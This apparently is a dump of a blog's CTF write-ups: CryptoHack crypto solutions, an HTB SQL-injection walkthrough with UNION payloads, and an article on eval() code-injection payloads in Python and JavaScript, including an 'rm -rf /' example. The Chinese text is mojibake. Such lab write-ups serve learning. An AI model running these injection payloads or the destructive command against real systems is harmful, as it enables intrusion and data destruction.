(-1)^{\\frac{p-1}{2}} \\equiv -1 \\text{ mod }pä¹Ÿå°±æ˜¯è¯´ (\\frac{a}{p}) = 1 (\\frac{-1}{p}) = -1å³$a$æ˜¯äºŒæ¬¡å‰©ä½™ï¼ˆquadratic residueï¼‰ï¼ˆæ‰€ä»¥$a^e$åŒæ ·ä¹Ÿæ˜¯ï¼‰ï¼Œè€Œ$-1$ä¸æ˜¯ã€‚æ‰€ä»¥cæ˜¯å¦æ˜¯äºŒæ¬¡å‰©ä½™å–å†³äºbçš„å€¼ï¼Œå³ (\\frac{c}{p}) = 1 \\Longleftrightarrow b=0 (\\frac{c}{p}) = -1 \\Longleftrightarrow b=1ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡è®¡ç®—æ¯ä¸€é¡¹å¯†æ–‡çš„Legendre Symbolçš„å€¼æ¥è¿˜åŸbçš„å€¼ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283a = 288260533169915p = 1007621497415251assert pow(a,(p-1)//2,p) == 1assert pow(-1,(p-1)//2,p) == p-1ciphertext_list = [ 67594220461269, 501237540280788, 718316769824518, 296304224247167, 48290626940198, 30829701196032, 521453693392074, 840985324383794, 770420008897119, 745131486581197, 729163531979577, 334563813238599, 289746215495432, 538664937794468, 894085795317163, 983410189487558, 863330928724430, 996272871140947, 352175210511707, 306237700811584, 631393408838583, 589243747914057, 538776819034934, 365364592128161, 454970171810424, 986711310037393, 657756453404881, 388329936724352, 90991447679370, 714742162831112, 62293519842555, 653941126489711, 448552658212336, 970169071154259, 339472870407614, 406225588145372, 205721593331090, 926225022409823, 904451547059845, 789074084078342, 886420071481685, 796827329208633, 433047156347276, 21271315846750, 719248860593631, 534059295222748, 879864647580512, 918055794962142, 635545050939893, 319549343320339, 93008646178282, 926080110625306, 385476640825005, 483740420173050, 866208659796189, 883359067574584, 913405110264883, 898864873510337, 208598541987988, 23412800024088, 911541450703474, 57446699305445, 513296484586451, 180356843554043, 756391301483653, 823695939808936, 452898981558365, 383286682802447, 381394258915860, 385482809649632, 357950424436020, 212891024562585, 906036654538589, 706766032862393, 500658491083279, 134746243085697, 240386541491998, 850341345692155, 826490944132718, 329513332018620, 41046816597282, 396581286424992, 488863267297267, 92023040998362, 529684488438507, 925328511390026, 524897846090435, 413156582909097, 840524616502482, 325719016994120, 402494835113608, 145033960690364, 43932113323388, 683561775499473, 434510534220939, 92584300328516, 763767269974656, 289837041593468, 11468527450938, 628247946152943, 8844724571683, 813851806959975, 72001988637120, 875394575395153, 70667866716476, 75304931994100, 226809172374264, 767059176444181, 45462007920789, 472607315695803, 325973946551448, 64200767729194, 534886246409921, 950408390792175, 492288777130394, 226746605380806, 944479111810431, 776057001143579, 658971626589122, 231918349590349, 699710172246548, 122457405264610, 643115611310737, 999072890586878, 203230862786955, 348112034218733, 240143417330886, 927148962961842, 661569511006072, 190334725550806, 763365444730995, 516228913786395, 846501182194443, 741210200995504, 511935604454925, 687689993302203, 631038090127480, 961606522916414, 138550017953034, 932105540686829, 215285284639233, 772628158955819, 496858298527292, 730971468815108, 896733219370353, 967083685727881, 607660822695530, 650953466617730, 133773994258132, 623283311953090, 436380836970128, 237114930094468, 115451711811481, 674593269112948, 140400921371770, 659335660634071, 536749311958781, 854645598266824, 303305169095255, 91430489108219, 573739385205188, 400604977158702, 728593782212529, 807432219147040, 893541884126828, 183964371201281, 422680633277230, 218817645778789, 313025293025224, 657253930848472, 747562211812373, 83456701182914, 470417289614736, 641146659305859, 468130225316006, 46960547227850, 875638267674897, 662661765336441, 186533085001285, 743250648436106, 451414956181714, 527954145201673, 922589993405001, 242119479617901, 865476357142231, 988987578447349, 430198555146088, 477890180119931, 844464003254807, 503374203275928, 775374254241792, 346653210679737, 789242808338116, 48503976498612, 604300186163323, 475930096252359, 860836853339514, 994513691290102, 591343659366796, 944852018048514, 82396968629164, 152776642436549, 916070996204621, 305574094667054, 981194179562189, 126174175810273, 55636640522694, 44670495393401, 74724541586529, 988608465654705, 870533906709633, 374564052429787, 486493568142979, 469485372072295, 221153171135022, 289713227465073, 952450431038075, 107298466441025, 938262809228861, 253919870663003, 835790485199226, 655456538877798, 595464842927075, 191621819564547]flag_bits = []power = (p-1)//2# è¿˜åŸbitsæ ¼å¼ä¸‹çš„flagfor c in ciphertext_list: ls = pow(c, power, p) if ls == 1: flag_bits.append(&#x27;1&#x27;) else: flag_bits.append(&#x27;0&#x27;) # è¿˜åŸbytesæ ¼å¼ä¸‹çš„flagflag_bytes = bytearray()for i in range(0, len(flag_bits), 8): byte_str = &#x27;&#x27;.join(flag_bits[i:i+8]) flag_bytes.append(int(byte_str, 2))print(flag_bytes.decode())# crypto&#123;p4tterns_1n_re5idu3s&#125; Modular Binomialsé¢˜ 123456N = 14905562257842714057932724129575002825405393502650869767115942606408600343380327866258982402447992564988466588305174271674657844352454543958847568190372446723549627752274442789184236490768272313187410077124234699854724907039770193680822495470532218905083459730998003622926152590597710213127952141056029516116785229504645179830037937222022291571738973603920664929150436463632305664687903244972880062028301085749434688159905768052041207513149370212313943117665914802379158613359049957688563885391972151218676545972118494969247440489763431359679770422939441710783575668679693678435669541781490217731619224470152467768073e1 = 12886657667389660800780796462970504910193928992888518978200029826975978624718627799215564700096007849924866627154987365059524315097631111242449314835868137e2 = 12110586673991788415780355139635579057920926864887110308343229256046868242179445444897790171351302575188607117081580121488253540215781625598048021161675697c1 = 14010729418703228234352465883041270611113735889838753433295478495763409056136734155612156934673988344882629541204985909650433819205298939877837314145082403528055884752079219150739849992921393509593620449489882380176216648401057401569934043087087362272303101549800941212057354903559653373299153430753882035233354304783275982332995766778499425529570008008029401325668301144188970480975565215953953985078281395545902102245755862663621187438677596628109967066418993851632543137353041712721919291521767262678140115188735994447949166616101182806820741928292882642234238450207472914232596747755261325098225968268926580993051c2 = 14386997138637978860748278986945098648507142864584111124202580365103793165811666987664851210230009375267398957979494066880296418013345006977654742303441030008490816239306394492168516278328851513359596253775965916326353050138738183351643338294802012193721879700283088378587949921991198231956871429805847767716137817313612304833733918657887480468724409753522369325138502059408241232155633806496752350562284794715321835226991147547651155287812485862794935695241612676255374480132722940682140395725089329445356434489384831036205387293760789976615210310436732813848937666608611803196199865435145094486231635966885932646519 è§£æˆ‘ä»¬ä¸€å¼€å§‹ä¼šå¾—åˆ°è¿™å‡ ä¸ªç­‰å¼ï¼š \\begin{align*} N &= p \\cdot q \\\\ c_1 &\\equiv (2 \\cdot p + 3 \\cdot q)^{e_1} \\mod N \\\\ c_2 &\\equiv (5 \\cdot p + 7 \\cdot q)^{e_2} \\mod N \\end{align*}é€šè¿‡è§‚å¯Ÿå¯ä»¥å‘ç° \\begin{align*} \\frac{c_2^{e_1}}{c_1^{e_2}} &\\equiv (\\frac{7}{3})^{e_1e_2} \\mod p \\\\ \\frac{c_2^{e_1}}{c_1^{e_2}} &\\equiv (\\frac{5}{2})^{e_1e_2} \\mod q \\\\ \\end{align*}æˆ‘ä»¬ç°åœ¨è®¾ \\begin{align*} A &:= \\frac{c_2^{e_1}}{c_1^{e_2}} \\mod N \\\\ B &:= (\\frac{7}{3})^{e_1e_2} \\mod N \\\\ \\end{align*}ï¼ˆæ³¨æ„ï¼Œå› ä¸ºNåªæœ‰2ä¸ªè´¨å› æ•°ï¼Œä¸”éƒ½ä¸ç­‰äº3ï¼Œæ‰€ä»¥3åœ¨$\\mathbb{Z}/N\\mathbb{Z}$é‡Œæ˜¯ï¼ˆä¹˜æ³•ï¼‰å¯é€†çš„ã€‚ï¼‰ åˆ™æœ‰ A \\equiv (\\frac{7}{3})^{e_1e_2} \\equiv B \\mod p\\\\ A \\equiv (\\frac{5}{2})^{e_1e_2} \\not\\equiv B \\mod q\\\\ä¹Ÿå°±æ˜¯è¯´$p \\mid (A-B) $ ä½† $q \\nmid (A-B)$ã€‚æ‰€ä»¥ä¾¿å¯ä»¥ç”±æ­¤è½»æ¾è®¡ç®—å‡ºpï¼š p = \\text{gcd}(A-B,N)å†è®¡ç®—$q = N/p$ã€‚ ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435import mathN = 14905562257842714057932724129575002825405393502650869767115942606408600343380327866258982402447992564988466588305174271674657844352454543958847568190372446723549627752274442789184236490768272313187410077124234699854724907039770193680822495470532218905083459730998003622926152590597710213127952141056029516116785229504645179830037937222022291571738973603920664929150436463632305664687903244972880062028301085749434688159905768052041207513149370212313943117665914802379158613359049957688563885391972151218676545972118494969247440489763431359679770422939441710783575668679693678435669541781490217731619224470152467768073e1 = 12886657667389660800780796462970504910193928992888518978200029826975978624718627799215564700096007849924866627154987365059524315097631111242449314835868137e2 = 12110586673991788415780355139635579057920926864887110308343229256046868242179445444897790171351302575188607117081580121488253540215781625598048021161675697c1 = 14010729418703228234352465883041270611113735889838753433295478495763409056136734155612156934673988344882629541204985909650433819205298939877837314145082403528055884752079219150739849992921393509593620449489882380176216648401057401569934043087087362272303101549800941212057354903559653373299153430753882035233354304783275982332995766778499425529570008008029401325668301144188970480975565215953953985078281395545902102245755862663621187438677596628109967066418993851632543137353041712721919291521767262678140115188735994447949166616101182806820741928292882642234238450207472914232596747755261325098225968268926580993051c2 = 14386997138637978860748278986945098648507142864584111124202580365103793165811666987664851210230009375267398957979494066880296418013345006977654742303441030008490816239306394492168516278328851513359596253775965916326353050138738183351643338294802012193721879700283088378587949921991198231956871429805847767716137817313612304833733918657887480468724409753522369325138502059408241232155633806496752350562284794715321835226991147547651155287812485862794935695241612676255374480132722940682140395725089329445356434489384831036205387293760789976615210310436732813848937666608611803196199865435145094486231635966885932646519# è®¡ç®— c2^e1 mod N å’Œ c1^e2 mod N c2_e1 = pow(c2, e1, N)c1_e2 = pow(c1, e2, N)inv_c1e2 = pow(c1_e2, -1, N) # è®¡ç®— A = c2^e1 * (c1^e2)^&#123;-1&#125; mod N A = (c2_e1 * inv_c1e2) % N# è®¡ç®— (7/3) mod Ninv3 = pow(3, -1, N)ratio73 = (7 * inv3) % N# æ„é€  B = (7/3)^(e1*e2) mod NB = pow(ratio73, e1 * e2, N)#å– gcd(A - B, N) å¾—åˆ° p p = math.gcd(A - B, N)# ç”± p å¾—åˆ° q q = N // passert p * q == Nprint(f&quot;crypto&#123;&#123;&#123;p&#125;,&#123;q&#125;&#125;&#125;&quot;)# crypto&#123;112274000169258486390262064441991200608556376127408952701514962644340921899196091557519382763356534106376906489445103255177593594898966250176773605432765983897105047795619470659157057093771407309168345670541418772427807148039207489900810013783673957984006269120652134007689272484517805398390277308001719431273,132760587806365301971479157072031448380135765794466787456948786731168095877956875295282661565488242190731593282663694728914945967253173047324353981530949360031535707374701705328450856944598803228299967009004598984671293494375599408764139743217465012770376728876547958852025425539298410751132782632817947101601&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://archer-baiyi.github.io/tags/Crypto/"},{"name":"Cryptohack","slug":"Cryptohack","permalink":"https://archer-baiyi.github.io/tags/Cryptohack/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"}]},{"title":"Cyptohack Introduction_to_CryptoHack Writeup","slug":"CTF/Crypto/Cyptohack-Introduction_to_CryptoHack-Writeup","date":"2025-05-31T19:23:21.000Z","updated":"2025-06-01T16:32:32.503Z","comments":true,"path":"2025/05/31/CTF/Crypto/Cyptohack-Introduction_to_CryptoHack-Writeup/","permalink":"https://archer-baiyi.github.io/2025/05/31/CTF/Crypto/Cyptohack-Introduction_to_CryptoHack-Writeup/","excerpt":"","text":"ASCIIé¢˜ç›® è§£ç”¨Pythonè‡ªå¸¦çš„chr()å‡½æ•°å³å¯ï¼š 123456789str_list = [99, 114, 121, 112, 116, 111, 123, 65, 83, 67, 73, 73, 95, 112, 114, 49, 110, 116, 52, 98, 108, 51, 125]flag = &quot;&quot;for i in str_list: flag+= chr(i) print(flag)# crypto&#123;ASCII_pr1nt4bl3&#125; Hexé¢˜ç›® è§£ç”¨Pythonè‡ªå¸¦çš„bytes.fromhex()å‡½æ•°å³å¯ï¼š 1234hex_str = &quot;63727970746f7b596f755f77696c6c5f62655f776f726b696e675f776974685f6865785f737472696e67735f615f6c6f747d&quot;print(bytes.fromhex(hex_str).decode())# crypto&#123;You_will_be_working_with_hex_strings_a_lot&#125; Base64é¢˜ç›® è§£éœ€è¦ç”¨åˆ°base64è¿™ä¸ªåº“çš„base64.b64encode()å‡½æ•°ï¼š 123456789import base64hex_content = &quot;72bca9b68fc16ac7beeb8f849dca1d8a783e8acf9679bf9269f7bf&quot;b_c = bytes.fromhex(hex_content)print(base64.b64encode(b_c).decode())# crypto/Base+64+Encoding+is+Web+Safe/ Bytes and Big Integersé¢˜ç›® è§£éœ€è¦ç”¨åˆ°PyCryptodomeåº“çš„Crypto.Util.numberçš„long_to_bytes()å‡½æ•°ï¼š 123456from Crypto.Util.number import *m = 11515195063862318899931685488813747395775516287289682636499965282714637259206269print(long_to_bytes(m))# b&#x27;crypto&#123;3nc0d1n6_4ll_7h3_w4y_d0wn&#125;&#x27; XOR Starteré¢˜ç›® è§£12345678s = &quot;label&quot;new_s = &quot;&quot;for i in s: new_s += chr((ord(i) ^ 13)) print(f&quot;crypto&#123;&#123;&#123;new_s&#125;&#125;&#125;&quot;)# crypto&#123;aloha&#125; æˆ–è€…ç”¨pwntollsåº“çš„xor()å‡½æ•°ï¼š 123456789from pwn import *s = &quot;label&quot;new_s = xor(s,13).decode()print(f&quot;crypto&#123;&#123;&#123;new_s&#125;&#125;&#125;&quot;)# BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes# strs = [packing.flat(s, word_size = 8, sign = False, endianness = &#x27;little&#x27;) for s in args]# crypto&#123;aloha&#125; XOR Propertiesé¢˜ç›® è§£12345678910from pwn import *k1 = bytes.fromhex(&quot;a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313&quot;)k12 = bytes.fromhex(&quot;37dcb292030faa90d07eec17e3b1c6d8daf94c35d4c9191a5e1e&quot;)k23 = bytes.fromhex(&quot;c1545756687e7573db23aa1c3452a098b71a7fbf0fddddde5fc1&quot;)f123 = bytes.fromhex(&quot;04ee9855208a2cd59091d04767ae47963170d1660df7f56f5faf&quot;)flag = xor( xor(f123,k23) , k1)print(flag)# b&#x27;crypto&#123;x0r_i5_ass0c1at1v3&#125;&#x27; Favourite byteé¢˜ç›® è§£1234567891011c = bytes.fromhex(&quot;73626960647f6b206821204f21254f7d694f7624662065622127234f726927756d&quot;)m =b&quot;&quot;for key in range(256): m = bytes([b ^ key for b in c]) if b&quot;crypto&quot; in m: print(key) print(m) break# 16# b&#x27;crypto&#123;0x10_15_my_f4v0ur173_by7e&#125;&#x27; You either know, XOR you donâ€™té¢˜ç›® è§£é€šè¿‡å·²çŸ¥çš„flagæ ¼å¼å¼€å¤´å¯ä»¥ç¡®å®šå‰å‡ ä½å¯†é’¥ï¼ˆmyXORkeï¼‰ï¼Œå†æ ¹æ®flagæ ¼å¼ç»“å°¾ï¼ˆ&#125;ï¼‰ç¡®å®šå¯†é’¥çš„æœ€åä¸€ä½ï¼ˆyï¼‰ã€‚ 1234567891011121314151617from pwn import *c = bytes.fromhex(&quot;0e0b213f26041e480b26217f27342e175d0e070a3c5b103e2526217f27342e175d0e077e263451150104&quot;)known_flag = b&quot;crypto&#123;&quot;known_key_begin = xor( c[0:len(known_flag)] , known_flag ) # print(known_key_begin) # b&#x27;myXORke&#x27;known_key_end = xor( c[-1] , b&quot;&#125;&quot; ) # print(known_key_end) # b&#x27;y&#x27;key = b&#x27;myXORkey&#x27;flag = xor(c,key)print(flag)# b&#x27;crypto&#123;1f_y0u_Kn0w_En0uGH_y0u_Kn0w_1t_4ll&#125;&#x27;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://archer-baiyi.github.io/tags/Crypto/"},{"name":"Cryptohack","slug":"Cryptohack","permalink":"https://archer-baiyi.github.io/tags/Cryptohack/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"}]},{"title":"HTB Unholy_Union Writeup","slug":"CTF/Web/HTB-Unholy_Union-Writeup","date":"2025-05-31T08:25:27.000Z","updated":"2025-05-31T08:45:33.538Z","comments":true,"path":"2025/05/31/CTF/Web/HTB-Unholy_Union-Writeup/","permalink":"https://archer-baiyi.github.io/2025/05/31/CTF/Web/HTB-Unholy_Union-Writeup/","excerpt":"","text":"é¢˜ç›®æè¿° è§‚å¯Ÿæ‰“å¼€ç½‘é¡µï¼š éšä¾¿å°è¯•è¾“å…¥ç‚¹å†…å®¹ä¼šå‘ç° æœç´¢çš„è¯­å¥æ˜¯ 1SELECT * FROM inventory WHERE name LIKE &#x27;%1%&#x27; æ‰€æœ‰å°è¯•è¾“å…¥ 1&#x27; OR 1=1 -- - ä¼šå‘ç°å¯ä»¥æ³¨å…¥æˆåŠŸã€‚ æ³¨æ„ï¼Œåœ¨MySQL/MariaDBä¸­ï¼Œå¦‚æœ -- åç´§è·Ÿ %ï¼Œå®ƒ ä¸ä¼šè¢«è¯†åˆ«ä¸ºæ³¨é‡Šç¬¦ï¼Œè€Œæ˜¯è§†ä½œ --%ï¼Œå¯¼è‡´SQLè¯­æ³•é”™è¯¯ã€‚æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œæ³¨å…¥æ—¶éœ€è¦åœ¨--åé¢åŠ ä¸Šç©ºæ ¼ä»¥åŠä¸€ä¸ªä»»æ„ç¬¦å·/å­—æ¯/æ•°å­—ï¼ˆæ¯”å¦‚è¯´-ï¼‰ã€‚ ä¹Ÿå°±æ˜¯è¯´è¿™é“é¢˜çš„æ³¨å…¥æ ¼å¼ä¸º 1&#x27; injection_code -- - å¹¶ä¸”æ³¨æ„åˆ°å½“å‰çš„è¡¨æ ¼ä¸€å…±æœ‰5åˆ—å†…å®¹ã€‚ æ¸—é€ç”±äºåœ¨å½“å‰è¡¨æ ¼é‡Œæ²¡æœ‰æ‰¾åˆ°flagç›¸å…³çš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæŸ¥çœ‹å½“å‰æ‰€æœ‰çš„è¡¨æ ¼ä¿¡æ¯ï¼š 1&#x27; UNION SELECT null, table_name, null, null,null FROM information_schema.tables WHERE table_schema=database() -- - å‘ç°æœ‰ä¸€ä¸ªåä¸ºflagçš„è¡¨æ ¼ã€‚é‚£ä¹ˆç°åœ¨æ¥æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªè¡¨æ ¼æœ‰å“ªäº›åˆ—ï¼š 1&#x27; UNION SELECT column_name, null,null,null, null FROM information_schema.columns WHERE table_name=&#x27;flag&#x27; -- - å‘ç°åªæœ‰ä¸€åˆ—å†…å®¹ï¼Œå¹¶ä¸”è¿™åˆ—çš„åå­—ä¹Ÿå«flagã€‚æ¥ç€æŸ¥çœ‹è¿™åˆ—çš„å…·ä½“å†…å®¹å³å¯å¾—åˆ°flagï¼š 1&#x27; UNION SELECT flag,null,null,null,null from flag -- - 1HTB&#123;un10n_1Nj3ct1on_15_345y_t0_l34rn_r1gh17?&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"SQL","slug":"SQL","permalink":"https://archer-baiyi.github.io/tags/SQL/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"}]},{"title":"åŠ¨æ€ä»£ç æ‰§è¡Œå‡½æ•°æ¼æ´","slug":"CTF/Web/åŠ¨æ€ä»£ç æ‰§è¡Œå‡½æ•°æ¼æ´","date":"2025-05-24T22:21:08.000Z","updated":"2025-05-25T16:22:58.779Z","comments":true,"path":"2025/05/25/CTF/Web/åŠ¨æ€ä»£ç æ‰§è¡Œå‡½æ•°æ¼æ´/","permalink":"https://archer-baiyi.github.io/2025/05/25/CTF/Web/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/","excerpt":"å„ç§ç¼–ç¨‹è¯­è¨€ä¸­çš„åŠ¨æ€ä»£ç æ‰§è¡Œå‡½æ•°çš„å®‰å…¨é£é™©","text":"åŠ¨æ€ä»£ç æ‰§è¡Œå‡½æ•°åœ¨ç¼–ç¨‹è¯­è¨€ä¸­ï¼ŒåŠ¨æ€ä»£ç æ‰§è¡Œæ˜¯æŒ‡åœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œæ ¹æ®æ¥æ”¶åˆ°çš„å­—ç¬¦ä¸²åŠ¨æ€åœ°å°†å…¶å½“ä½œä»£ç æ¥æ‰§è¡Œã€‚è™½ç„¶è¿™ç§åŠŸèƒ½åœ¨æŸäº›åœºæ™¯ä¸‹éå¸¸çµæ´»ï¼ˆä¾‹å¦‚åŠ¨æ€ç”Ÿæˆä»£ç ã€è¿è¡Œç”¨æˆ·è¾“å…¥ï¼‰ï¼Œä½†å®ƒä¹Ÿå¸¦æ¥äº†å·¨å¤§çš„å®‰å…¨éšæ‚£ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ¶æ„è¾“å…¥æ³¨å…¥ä»£ç ï¼Œè¿›è€Œæ§åˆ¶ç³»ç»Ÿæˆ–çªƒå–æ•æ„Ÿä¿¡æ¯ã€‚ æˆ‘ä»¬ä¸‹é¢çœ‹ä¸€ä¸‹ä¸åŒè¯­è¨€ï¼ˆå¦‚ Pythonã€PHPã€JavaScriptï¼‰ä¸­å¸¸ç”¨çš„åŠ¨æ€ä»£ç æ‰§è¡Œå‡½æ•°åŠå…¶é£é™©ã€‚ Pythoneval()ç”¨é€”ï¼ševal() ä¼šå°†ä¼ å…¥çš„å­—ç¬¦ä¸²å½“ä½œ Python è¡¨è¾¾å¼æ¥æ‰§è¡Œã€‚ å®‰å…¨éšæ‚£ï¼šå¦‚æœç”¨æˆ·è¾“å…¥æœªç»éªŒè¯çš„å­—ç¬¦ä¸²ä¼ ç»™ eval()ï¼Œæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚ ä¾‹å­ï¼š 123result = eval(input(&quot;Enter a math expression: &quot;))print(result) é‚£ä¹ˆå½“æˆ‘ä»¬è¾“å…¥ 1os.system(&#x27;rm -rf /&#x27;) æ—¶ä¼šå¯¼è‡´åˆ é™¤ç³»ç»Ÿæ–‡ä»¶ã€‚ Payloadï¼š 1234567891011121314151617181920212223open(&#x27;flag.txt&#x27;).read()__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()__import__(&#x27;os&#x27;).system(&#x27;cat flag.txt&#x27;)exec(&quot;__import__(&#x27;os&#x27;).system(&#x27;cat flag.txt&#x27;)&quot;)getattr(__import__(&#x27;os&#x27;), &#x27;system&#x27;)(&#x27;cat flag.txt&#x27;)__import__(&#x27;builtins&#x27;).open(&#x27;flag.txt&#x27;).read()globals()[&#x27;__builtins__&#x27;].__dict__[&#x27;open&#x27;](&#x27;flag.txt&#x27;).read()globals()[&#x27;__builtins__&#x27;].open(&#x27;flag.txt&#x27;).read()__import__(&#x27;subprocess&#x27;).check_output([&#x27;cat&#x27;, &#x27;flag.txt&#x27;])__import__(&#x27;sh&#x27;).cat(&#x27;flag.txt&#x27;) # éœ€è¦å®‰è£…äº†shåº“sh.cat(&#x27;flag.txt&#x27;) # éœ€è¦å®‰è£…äº†shåº“ ï¼ˆçœ‹æƒ…å†µåœ¨flag.txtå‰é¢åŠ ä¸Š/æˆ–è€…../ï¼‰ ä¹Ÿå¯ä»¥åˆ©ç”¨breakpoint()ï¼ˆPython3.7+ ä¸­çš„è°ƒè¯•å·¥å…·ï¼Œå¯ä»¥ç›´æ¥å¯åŠ¨äº¤äº’å¼è°ƒè¯•å™¨ï¼ˆæ¯”å¦‚ pdbï¼‰ï¼‰ï¼š 123breakpoint()# ç„¶ååœ¨pdbçš„æç¤ºç¬¦å‡ºæ¥åè¾“å…¥!print(open(&quot;flag.txt&quot;).read()) ! ä¼šè®© pdb æ‰§è¡Œä¸€æ¡æ™®é€š Python è¯­å¥ã€‚ ç‰¹æ®Šæƒ…å†µä¹Ÿå¯ä»¥ä½¿ç”¨ï¼š 1234eval(input(&quot;Enter: &quot;))#ç„¶åè¾“å…¥__import__(&#x27;os&#x27;).system(&#x27;cat flag.txt&#x27;) æ³¨æ„ï¼Œè¿™é‡Œçš„ç¬¬ä¸€è¡Œä»£ç çš„eval()æ˜¯é¢å¤–è¾“å…¥çš„ï¼Œå¹¶ä¸æ˜¯æŒ‡ç¨‹åºåŸæœ¬çš„ã€‚è¿™ç‚¹éå¸¸é‡è¦ï¼Œä¸å¤šè¾“å…¥ä¸€ä¸ªeval()ä¼šå¤±è´¥ã€‚åŒºåˆ«ï¼š 12345678&gt;&gt; eval(input(&quot;Enter: &quot;))Enter: __import__(&#x27;os&#x27;).system(&#x27;cat flag.txt&#x27;)flag&#123;fake_flag&#125;eval(input(&quot;Enter: &quot;)) --&gt; 0&gt;&gt; input(&quot;Enter: &quot;)Enter: __import__(&#x27;os&#x27;).system(&#x27;cat flag.txt&#x27;)input(&quot;Enter: &quot;) --&gt; __import__(&#x27;os&#x27;).system(&#x27;cat flag.txt&#x27;) exec()compile()ç›¸æ¯”å‰ä¸¤ä¸ªä¼šå®‰å…¨å¾ˆå¤šã€‚ ä¾‹å­ï¼š 123user_input = &quot;os.system(&#x27;rm -rf /&#x27;)&quot; # æ¶æ„è¾“å…¥code = compile(user_input, &quot;&lt;string&gt;&quot;, &quot;exec&quot;)exec(code) # æ‰§è¡Œäº†æ¶æ„ä»£ç  å› ä¸ºåªæœ‰å½“æˆ‘ä»¬èƒ½é€šè¿‡è¾“å…¥æ§åˆ¶compile()çš„ä¸‰ä¸ªå‚æ•°æ—¶æ‰å¯ä»¥è¿›è¡ŒRCEæ”»å‡»ã€‚ PHPeval()JavaScripteval()ä¾‹å­ï¼š 12345678910111213141516171819202122router.post(&#x27;/api/calculate&#x27;, (req, res) =&gt; &#123; let &#123; formula &#125; = req.body; if (formula) &#123; result = Calculator.calculate(formula); return res.send(response(result)); &#125; return res.send(response(&#x27;Missing parameters&#x27;));&#125;);module.exports = &#123; calculate: function(formula) &#123; try &#123; return eval(`(function() &#123; return $&#123;formula&#125;; &#125;)()`); // æ¼æ´æ‰€åœ¨ &#125; catch (e) &#123; if (e instanceof SyntaxError) &#123; return &#x27;Something went wrong!&#x27;; &#125; &#125; &#125;&#125;; æ‰€ä»¥å½“è¾“å…¥ 1global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag.txt&#x27;).toString() æ—¶å¯ä»¥æˆåŠŸè¯»å–flagã€‚","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://archer-baiyi.github.io/tags/Python/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"PHP","slug":"PHP","permalink":"https://archer-baiyi.github.io/tags/PHP/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://archer-baiyi.github.io/tags/JavaScript/"},{"name":"eval()","slug":"eval","permalink":"https://archer-baiyi.github.io/tags/eval/"}]},{"title":"Ocaml å…¥é—¨","slug":"ç¼–ç¨‹/Ocaml-å…¥é—¨","date":"2025-05-22T14:25:04.000Z","updated":"2025-10-09T20:24:54.472Z","comments":true,"path":"2025/05/22/ç¼–ç¨‹/Ocaml-å…¥é—¨/","permalink":"https://archer-baiyi.github.io/2025/05/22/%E7%BC%96%E7%A8%8B/Ocaml-%E5%85%A5%E9%97%A8/","excerpt":"","text":"OCaml æ˜¯ä¸€ç§æ”¯æŒå‡½æ•°å¼ã€å‘½ä»¤å¼å’Œé¢å‘å¯¹è±¡ç¼–ç¨‹èŒƒå¼çš„é™æ€ç±»å‹è¯­è¨€ã€‚ ä¸‹è½½å»ºè®®åœ¨MacOSï¼ŒLinux(WSL)ç³»ç»Ÿä¸Šè¿è¡ŒOcamlã€‚ ä¾æ¬¡è¿è¡Œä»¥ä¸‹å‘½ä»¤å³å¯ä¸‹è½½OcamlåŠå…¶ç›¸å…³å·¥å…·ï¼š Linuxï¼š 1234567891011121314151617181920# 1. æ›´æ–°ç³»ç»ŸåŒ…ç´¢å¼•sudo apt update# 2. å®‰è£… opamï¼ˆOCaml çš„åŒ…ç®¡ç†å™¨ï¼‰sudo apt install opam -y# 3. åˆå§‹åŒ– opamï¼ˆé¦–æ¬¡è¿è¡Œä¼šåˆ›å»ºé…ç½®æ–‡ä»¶ï¼‰opam init -y --bare# 4. åŠ è½½ opam ç¯å¢ƒå˜é‡ï¼ˆå°† ocaml ç­‰å‘½ä»¤åŠ å…¥ PATHï¼‰eval $(opam env)# 5. 